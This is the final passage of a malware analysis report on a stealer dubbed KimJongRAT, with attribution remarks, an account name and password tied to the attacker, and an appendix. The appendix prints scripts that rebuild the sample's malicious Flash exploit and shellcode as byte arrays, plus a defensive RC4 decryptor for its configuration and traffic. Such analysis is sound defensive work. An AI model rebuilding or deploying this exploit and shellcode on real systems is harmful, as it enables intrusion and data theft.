deployment\n\nFigure 22: Exploit and files deployment schema\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 28 f 36\n\n\n-----\n\n### 6.2 Starting of the malware\n\nFigure 23: malware starting schema\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 29 f 36\n\n\n-----\n\n### 6.3 Communication to the Commands and Control\n\nFigure 24: communication to the C&C schema\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 30 f 36\n\n\n-----\n\n# 7 Conclusion\n\n###### The analysed malware is a stealer with some remote code execution features but these features are not the biggest part of the malware. The developers made considerable effort to:\n\n - obfuscate the code and the configuration;\n - hook functions by hiding files;\n - use weird implementation of RC4 or base64.\n\n We conclude that this RAT/stealer is efficient and was also really interesting to analyse.\n\n Furthermore, the creator made efforts to look Korean, for example the author of the .pdf file is Kim Song Chol. He is the brother of Kim Jong-un, the leader of North Korea. We identified that the author of a variant of this stealer is another brother of Kim Jong-un. Maybe the author named every variant with the name of each brother. \n\n After some searches using Google, we identified an old variant of this malware here: http://contagiodump.blogspot.ca/2010/10/oct-08-cve-2010-2883-pdf-nuclear.html. The code of the malware available on the blog is close to our case but with fewer features. In 2010, the password of the Gmail account was \"futurekimkim\". Three years ago, the author was already fixated on the Kim family…\n\n The language of the resource stored in the .dll file is Korean (LANG_KOREAN). The owner of the gmail mailbox is laoshi135.zhang and the secret question of this account is in Korean too.\n\n We don’t know if the malware truly comes from Korea. However, thanks to these factors, we decided to name this sample KimJongRAT/Stealer.\n\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 31 f 36\n\n\n-----\n\n# Appendix\n\n### Exploit from stream 14\n```\npaul@malware.lu:~$ cat exploit_from_stream14.py\nnewarr = [70, 87, 83, 10, 204, 5, 0, 0, 120, 0, 5, 95, 0, 0, 15, 160, 0, 0, 24, 1, 0, 68, 17, 0,\n0, 0, 0, 63, 3, 167, 5, 0, 0, 150, 12, 0, 5, 0, 7, 149, 195, 124, 19, 7, 251, 195, 124, 19, 14, 18,\n157, 2, 0, 76, 4, 157, 2, 0, 24, 0, 136, 21, 0, 9, 0, 65, 0, 66, 0, 67, 0, 68, 0, 69, 0, 70, 0, 71,\n0, 72, 0, 73, 0, 161, 142, 17, 0, 100, 101, 102, 97, 117, 108, 116, 0, 1, 0, 4, 42, 0, 2, 0, 152, 1,\n150, 10, 0, 7, 88, 192, 73, 72, 7, 167, 63, 182, 183, 96, 157, 2, 0, 0, 0, 153, 2, 0, 73, 0, 64,\n150, 5, 0, 7, 22, 116, 112, 11, 76, 98, 157, 2, 0, 12, 0, 135, 1, 0, 3, 23, 135, 1, 0, 1, 150, 10,\n0, 7, 235, 104, 33, 78, 7, 20, 151, 222, 177, 96, 157, 2, 0, 0, 0, 23, 135, 1, 0, 1, 150, 10, 0, 7,\n145, 252, 54, 26, 7, 110, 3, 201, 229, 96, 157, 2, 0, 0, 0, 153, 2, 0, 21, 0, 150, 13, 0, 1, 0, 0,\n0, 0, 3, 1, 0, 0, 0, 0, 8, 0, 153, 2, 0, 162, 255, 23, 150, 6, 0, 4, 1, 4, 2, 8, 1, 78, 72, 150, 10,\n0, 7, 221, 127, 77, 97, 7, 34, 128, 178, 158, 96, 157, 2, 0, 0, 0, 18, 157, 2, 0, 232, 0, 153, 2, 0,\n184, 0, 150, 10, 0, 7, 8, 70, 50, 45, 7, 247, 185, 205, 210, 96, 157, 2, 0, 0, 0, 82, 38, 150, 13,\n0, 4, 3, 4, 1, 7, 1, 0, 0, 0, 4, 2, 8, 2, 82, 150, 5, 0, 7, 142, 160, 89, 123, 76, 98, 157, 2, 0,\n19, 0, 150, 5, 0, 7, 3, 0, 0, 0, 11, 150, 5, 0, 7, 255, 83, 111, 8, 76, 98, 157, 2, 0, 10, 0, 150,\n7, 0, 7, 1, 0, 0, 0, 8, 0, 28, 150, 10, 0, 7, 68, 250, 46, 64, 7, 187, 5, 209, 191, 96, 157, 2, 0,\n0, 0, 150, 2, 0, 8, 3, 82, 71, 150, 5, 0, 7, 96, 145, 152, 47, 76, 98, 157, 2, 0, 11, 0, 135, 1, 0,\n3, 23, 150, 2, 0, 4, 1, 150, 5, 0, 7, 37, 130, 251, 68, 76, 98, 157, 2, 0, 9, 0, 80, 135, 1, 0, 1,\n23, 153, 2, 0, 57, 0, 150, 10, 0, 7, 7, 36, 7, 40, 7, 248, 219, 248, 215, 96, 157, 2, 0, 0, 0, 150,\n11, 0, 4, 1, 7, 1, 0, 0, 0, 4, 2, 8, 4, 153, 2, 0, 72, 255, 150, 10, 0, 7, 11, 3, 17, 55, 7, 244,\n252, 238, 200, 96, 157, 2, 0, 0, 0, 153, 2, 0, 244, 254, 150, 2, 0, 4, 3, 150, 5, 0, 7, 174, 8, 56,\n42, 76, 98, 157, 2, 0, 4, 0, 62, 150, 9, 0, 8, 5, 1, 0, 0, 0, 0, 8, 6, 64, 60, 153, 2, 0, 117, 0,\n150, 10, 0, 7, 15, 76, 45, 75, 7, 240, 179, 210, 180, 96, 157, 2, 0, 0, 0, 28, 150, 7, 0, 8, 7, 7,\n100, 0, 0, 0, 79, 28, 150, 10, 0, 7, 78, 82, 35, 2, 7, 177, 173, 220, 253, 96, 157, 2, 0, 0, 0, 77,\n82, 23, 28, 77, 150, 5, 0, 7, 200, 85, 197, 117, 76, 98, 157, 2, 0, 5, 0, 82, 23, 61, 28, 150, 11,\n0, 8, 8, 8, 9, 7, 1, 0, 0, 0, 8, 10, 61, 28, 150, 2, 0, 8, 11, 78, 153, 2, 0, 56, 0, 150, 5, 0, 7,\n195, 254, 159, 15, 76, 98, 157, 2, 0, 11, 0, 150, 33, 0, 8, 12, 7, 1, 0, 0, 0, 8, 10, 8, 13, 7, 1,\n0, 0, 0, 8, 14, 8, 5, 8, 15, 7, 1, 0, 0, 0, 8, 14, 8, 5, 8, 5, 153, 2, 0, 117, 255, 79, 150, 9, 0,\n8, 12, 7, 1, 0, 0, 0, 8, 10, 150, 5, 0, 7, 133, 88, 140, 53, 76, 98, 157, 2, 0, 7, 0, 61, 28, 150,\n5, 0, 7, 135, 37, 124, 104, 76, 98, 157, 2, 0, 7, 0, 150, 2, 0, 8, 16, 142, 8, 0, 0, 0, 0, 2, 41, 0,\n29, 0, 150, 9, 0, 1, 0, 0, 0, 0, 4, 1, 8, 8, 150, 5, 0, 7, 24, 223, 217, 123, 76, 98, 157, 2, 0, 10,\n0, 82, 23, 150, 10, 0, 7, 108, 104, 201, 64, 7, 147, 151, 54, 191, 96, 157, 2, 0, 0, 0, 79, 153, 2,\n0, 192, 0, 64, 150, 10, 0, 7, 161, 120, 6, 44, 7, 94, 135, 249, 211, 96, 157, 2, 0, 0, 0, 60, 64,\n60, 150, 10, 0, 7, 61, 154, 242, 59, 7, 194, 101, 13, 196, 96, 157, 2, 0, 0, 0, 28, 77, 82, 60, 150,\n10, 0, 7, 195, 31, 125, 55, 7, 60, 224, 130, 200, 96, 157, 2, 0, 0, 0, 28, 77, 82, 150, 5, 0, 7,\n230, 11, 183, 85, 76, 98, 157, 2, 0, 11, 0, 23, 28, 77, 82, 23, 28, 77, 150, 10, 0, 7, 74, 188, 126,\n120, 7, 181, 67, 129, 135, 96, 157, 2, 0, 0, 0, 82, 23, 28, 150, 5, 0, 7, 227, 221, 157, 30, 76, 98,\n157, 2, 0, 13, 0, 77, 82, 150, 5, 0, 7, 170, 165, 126, 74, 76, 98, 157, 2, 0, 12, 0, 23, 28, 77,\n150, 5, 0, 7, 179, 91, 62, 98, 76, 98, 157, 2, 0, 1, 0, 82, 23, 28, 77, 82, 23, 150, 10, 0, 7, 169,\n28, 6, 90, 7, 86, 227, 249, 165, 96, 157, 2, 0, 0, 0, 153, 2, 0, 227, 1, 150, 116, 0, 1, 0, 0, 0, 0,\n8, 17, 8, 18, 7, 1, 0, 0, 0, 8, 19, 7, 2, 0, 0, 0, 8, 20, 8, 21, 8, 22, 7, 1, 0, 0, 0, 8, 14, 8, 5,\n8, 23, 7, 1, 0, 0, 0, 8, 14, 8, 5, 8, 24, 7, 1, 0, 0, 0, 8, 14, 8, 5, 8, 25, 7, 1, 0, 0, 0, 8, 14,\n8, 5, 8, 26, 1, 0, 0, 0, 0, 8, 16, 8, 27, 8, 27, 6, 170, 170, 170, 170, 8, 5, 12, 12, 7, 1, 0, 0, 0,\n8, 28, 8, 29, 6, 251, 33, 9, 64, 74, 216, 18, 77, 7, 1, 0, 0, 0, 8, 28, 153, 2, 0, 196, 254, 150, 5,\n0, 7, 12, 245, 78, 21, 76, 98, 157, 2, 0, 15, 0, 150, 10, 0, 7, 233, 27, 136, 63, 7, 102, 28, 136,\n63, 14, 18, 157, 2, 0, 68, 1, 136, 36, 1, 30, 0, 83, 116, 114, 105, 110, 103, 0, 108, 101, 110, 103,\n116, 104, 0, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 0, 102, 114, 111, 109, 67, 104, 97, 114,\n67, 111, 100, 101, 0, 99, 104, 97, 114, 65, 116, 0, 99, 97, 115, 101, 0, 84, 101, 120, 116, 70, 111,\n114, 109, 97, 116, 0, 115, 105, 122, 101, 0, 65, 66, 67, 68, 69, 0, 86, 107, 100, 117, 104, 103, 82,\n101, 109, 104, 102, 119, 49, 115, 117, 114, 119, 114, 119, 124, 115, 104, 0, 100, 101, 102, 97, 117,\n108, 116, 0, 103, 101, 116, 83, 105, 122, 101, 0, 71, 100, 119, 104, 49, 115, 117, 114, 119, 114,\n119, 124, 115, 104, 0, 119, 119, 114, 115, 117, 114, 119, 64, 119, 43, 116, 104, 0, 103, 101, 116,\n84, 101, 120, 116, 69, 120, 116, 101, 110, 116, 0, 122, 119, 115, 119, 51, 115, 117, 114, 119, 114,\n119, 43, 116, 104, 0, 103, 101, 116, 68, 97, 121, 0, 103, 101, 116, 70, 111, 110, 116, 76, 105, 115,\n116, 0, 84, 101, 120, 116, 70, 105, 101, 108, 100, 0, 77, 97, 116, 104, 0, 99, 114, 101, 97, 116,\n101, 69, 109, 112, 116, 121, 77, 111, 118, 105, 101, 67, 108, 105, 112, 0, 116, 104, 105, 115, 0,\n73, 115, 82, 117, 110, 110, 105, 110, 103, 0, 115, 101, 116, 77, 111, 100, 101, 0, 76, 111, 97, 100,\n86, 97, 114, 115, 0, 103, 101, 116, 68, 101, 112, 116, 104, 0, 99, 97, 115, 101, 32, 0, 32, 99, 97,\n115, 101, 0, 68, 97, 116, 101, 0, 99, 111, 110, 116, 105, 110, 117, 101, 0, 76, 18, 153, 2, 0, 17,\n0, 150, 39, 1, 251, 104, 219, 57, 213, 84, 115, 52, 15, 70, 64, 158, 102, 18, 153, 2, 0, 112, 250,\n0, 64, 0, 0, 0];\nval = [chr(c) for c in newarr]\nopen('exploit.swf', 'w').write(\"\".join(val))\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 32 f 36\n\n\n-----\n\n### Shellcode from stream 14\n```\nrootbsd@malware.lu:~ $ cat shellcode_from_stream14.py \nimport struct\nimport sys\nshell = [3919511808, 1118481, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 286331153, 286331153,\n286331153, 286331153, 286331153, 286331153, 291271545, 1936615790,\n1769221743, 1668808819, 1751477356, 858926692, 1819017314, 979129209,\n1937007981, 542535532, 1970103584, 1819174511, 1919770996, 1768910336,\n2366442513, 1073742669, 2622589773, 3360816981, 3560161386, 6955114,\n57278570, 28344513, 3759689867, 1304973823, 1438419269, 2421227349,\n2553528426, 6955626, 40501354, 45105345, 3759689867, 1304973823,\n1438419269, 2495832149, 2339120172, 2336570507, 1409644547, 3582675480,\n2337939459, 3712584500, 2332292403, 4281581820, 2894381172, 130141965,\n66644980, 997991464, 1977846618, 604233062, 2332838795, 1511785437,\n2332330755, 3311241541, 3764489029, 3770812416, 2347512768, 1723334672,\n736160518, 1518594565, 3943033077, 4294967120, 2365977873, 1073753040,\n2304089229, 93393216, 214428, 2303057037, 88281408, 214428, 2303056013,\n96670784, 214428, 2303034419, 3375612080, 811895552, 2336230539,\n1880918838, 2337671307, 2116052537, 1327003122, 2151639924, 125845323,\n1946348518, 2155809843, 1977649493, 3096141240, 1399368392, 3366190933,\n3697960077, 2380595199, 4283534605, 1141915648, 55417993, 1304973823,\n1440764776, 465979001, 4283817101, 2381905919, 4283525696, 4285919487,\n1977941845, 3763562732, 2533559551, 1440528384, 2097232, 1782775637,\n3767092656, 1399340066, 2844327765, 3707729328, 4283818121, 1168921448,\n2387480300, 4283817097, 1166562152, 71906003, 4283817097, 1166037864,\n1851375464, 4283817097, 1171542888, 2769748092, 4283817097, 1169970024,\n2886261366, 4283817097, 1170494312, 375781904, 4283817097, 1171018600,\n528026344, 4283817097, 1171280744, 4221041935, 4283817097, 1167610728,\n2912648671, 4283817097, 1170232168, 1700384671, 4283817097, 1169437641,\n1365901393, 4283809853, 1707278336, 1913400677, 3271557251, 4160779272,\n3958200707, 3238325216, 2403701811, 3226488836, 22085493, 2499761604,\n868241545, 1166839173, 2365587455, 1348993024, 536906573, 2891054965,\n2499761612, 3092457255, 1395902859, 1437352249, 67794426, 2210464825,\n67794418, 2210464771, 3515438504, 3091539751, 1161021761, 956566133,\n4202938628, 956566133, 4068731140, 2303566899, 3233000075, 1302629237,\n2827621382, 852723732, 104872897, 1928344521, 1719910667, 2339743883,\n4270059275, 4243825715, 3230354852, 2339743882, 335972956, 100807379,\n2321286667, 852723732, 104872897, 1927711557, 2827216907, 2303043635,\n3378938305, 3355478901, 3364584872, 737739645, 2768040868, 2365921809,\n1073742661, 2622553941, 2156132352, 1949076440, 1399351240, 1161297749,\n3700116936, 1365901418, 6953578, 16733664, 4283816067, 2106916725,\n1115913616, 4285793279, 1434727369, 2971503925, 638664704, 58039435,\n2110323955, 2760592840, 1367998974, 3230138822, 1092354154, 5373781,\n3036632536, 2206045439, 1963557757, 2432660701, 4283794538, 9274784,\n4294967120, 2374345983, 4294967088, 2336598096, 4285895935, 1439760245,\n2499761560, 2336606288, 4283795536, 1745572364, 1241470428, 4283818128];\nval = [struct.pack('>I',c) for c in shell]\nopen('sc_.bin', 'w').write(\"\".join(val))\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 33 f 36\n\n\n-----\n\n### Decrypt data\n```\nrootbsd@malware.lu:~$ cat decrypt.py \n#!/usr/bin/env python\n# -*- coding: utf-8 -*from Crypto.Cipher import ARC4\nimport sys\nimport argparse\nimport magic\nimport base64\nfrom urlparse import urlparse\nimport os\nimport os.path\nimport requests\ndef decode(data):\n  key = data[:0x10]\n  data = data[0x10:]\n  # remove null byte in case\n  data = data.strip('\\x00')\n  rc4 = ARC4.new(key)\n  return rc4.decrypt(data)\ndef get_magic(data):\n  try:\n    return magic.from_buffer(data)\n  except Exception, e:\n    print e\n    return \"\"\ndef extract_res(magictag, data, n = 0):\n  i = -1\n  res_end = 0\n  while i < n:\n    data = data[res_end:]\n    res_start = data.index(magictag) + len(magictag)\n    if res_start == None:\n      break\n    data = data[res_start:]\n    res_end = data.index(magictag) + len(magictag)\n    i += 1\n  # out magic end\n  data = data[:-0x8]\n  return decode(data)\ndef decode_file(data):\n  return decode(data)\ndef decode_config(data):\n  data = data[-0x208:]\n  return decode(data)\ndef decode_b64(data):\n  data = data.strip('\\n')\n  data = data.replace('.', '+')\n  data = base64.b64decode(data)\n  out = decode(data)\n  return out\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 34 f 36\n\n\n-----\n\n```\ndef decode_network(url):\n  uri_info = urlparse(url)\n  uri = os.path.basename(uri_info.path)\n  req = requests.get(url)\n  data = req.text\n  info = uri.split('_')\n  user_info = base64.b64decode(info[0]).split('_')\n  print \"computer name: %s\" % user_info[0]\n  print \"username: %s\" % user_info[1]\n  print \"last modified (headers): %s\" % req.headers['last-modified']\n  print \"-\"*32\n  lines = data.split('\\n')\n  for l in lines:\n    tag = \"ABCDEFGHIJKLMNOP\"\n    tag = l[:len(tag)]\n    counter = l[len(tag):20]\n    data = l[len(tag)+20:]\n    out = decode_b64(data)\n    print out\nif __name__ == \"__main__\":\n  parser = argparse.ArgumentParser(description='Chinese decoder.')\n  #parser.add_argument('filename', type=argparse.FileType(),\n    #help='file to extract resource')\n  parser.add_argument('filename', type=str,\n    help='file to extract resource')\n  parser.add_argument('-e', action='store_const', const='exe',\n      dest='action', help='extract all resource of the dll (default)')\n  parser.add_argument('-d', action='store_const', const='file',\n      dest='action', help='decode encrypted file like .ini')\n  parser.add_argument('-c', action='store_const', const='config',\n      dest='action', help='extract config of the dll')\n  parser.add_argument('-b', action='store_const', const='b64',\n      dest='action', help='decode network b64')\n  parser.add_argument('-n', action='store_const', const='network',\n      dest='action', help='decode network')\n  args = parser.parse_args()\n  if args.action == 'network':\n    decode_network(args.filename)\n    sys.exit(1)\n  fp = open(args.filename)\n  #fp = args.filename\n  data = fp.read()\n  if args.action == 'file':\n    out = decode_file(data)\n    filename = \"%s.dec\" % fp.name\n    print \"write decoded file in %s (%s)\" % \\\n      (filename, get_magic(out))\n    open(filename, 'w').write(out)\n  elif args.action == 'config':\n    out = decode_config(data)\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 35 f 36\n\n\n-----\n\n```\n    print out\n    filename = \"%s.dec\" % fp.name\n    #print \"write decoded file in %s (%s)\" % \\\n      #(filename, get_magic(out))\n    #open(filename, 'w').write(out)\n  elif args.action == 'b64':\n    out = decode_b64(data)\n    print out\n    filename = \"%s.dec\" % fp.name\n    #print \"write decoded file in %s (%s)\" % \\\n      #(filename, get_magic(out))\n    #open(filename, 'w').write(out)\n  else:\n    magictag = \"\\x7e\\x21\\x40\\x23\\x24\\x25\\x5e\\x26\"\n    i = 0\n    while True:\n      try:\n        out = extract_res(magictag, data, i)\n        filename = \"%s.%d.dec\" % (fp.name, i)\n        print \"write decoded file in %s (%s)\" % \\\n          (filename, get_magic(out))\n        open(filename, 'w').write(out)\n        i += 1\n      except Exception, e:\n        #print e\n        break\n\n```\nR f RAP003 Ki J RAT St l A l i 1 0 V i 1 0 P 36 f 36\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://malware.lu/assets/files/articles/RAP003_KimJongRAT-Stealer_Analysis.1.0.pdf"
    ],
    "report_names": [
        "RAP003_KimJongRAT-Stealer_Analysis.1.0.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1370883022,
    "ts_modification_date": 1370883022,
    "files": {
        "pdf": "https://archive.orkl.eu/736eda24a81b1b8102970d7398b19e519ddc4537.pdf",
        "text": "https://archive.orkl.eu/736eda24a81b1b8102970d7398b19e519ddc4537.txt",
        "img": "https://archive.orkl.eu/736eda24a81b1b8102970d7398b19e519ddc4537.jpg"
    }
}